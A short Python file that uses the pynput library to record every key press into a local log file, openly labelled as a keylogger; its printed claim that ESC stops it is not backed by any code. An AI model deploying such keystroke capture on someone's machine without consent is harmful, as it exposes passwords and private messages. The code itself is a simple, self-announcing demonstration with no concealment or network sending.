from pynput import keyboard

def on_press(key):
    with open("logs/keys.txt", "a") as f:
        f.write(str(key) + "\n")

def start_keylogger():
    print("Keylogger started (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
